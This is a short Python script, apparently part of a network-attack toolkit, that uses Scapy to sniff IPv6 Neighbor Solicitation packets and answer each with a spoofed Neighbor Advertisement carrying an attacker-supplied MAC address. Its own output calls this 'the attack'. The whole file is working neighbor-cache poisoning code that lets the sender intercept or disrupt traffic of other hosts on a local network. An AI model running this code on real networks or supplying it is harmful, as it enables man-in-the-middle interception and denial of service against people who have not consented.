#!/usr/bin/python
from scapy.layers.inet6 import ICMPv6ND_NS, IPv6, ICMPv6ND_NA, ICMPv6NDOptSrcLLAddr
from scapy.sendrecv import sniff, send


def spoof_NA(interface, smac):
    # Generate packet
    while True:
        try:
            packet_capture = sniff(lfilter=lambda pkt: ICMPv6ND_NS in pkt, count=1)
            base = IPv6()
            base.src = packet_capture[0][IPv6][ICMPv6ND_NS].tgt
            base.dst = packet_capture[0][IPv6].src
            packet_response = base / ICMPv6ND_NA(R=1, S=0, O=1, tgt=base.src) / \
                              ICMPv6NDOptSrcLLAddr(lladdr=smac)
            if interface == "":
                send(packet_response, verbose=False)
            else:
                send(packet_response, verbose=False, iface=interface)
            print("Answering with Neighbor Advertisement to a Neighbor Solicitation message from address: " +
                  packet_capture[0][IPv6].src + ", press Ctrl C to stop the attack")
        except KeyboardInterrupt:
            break
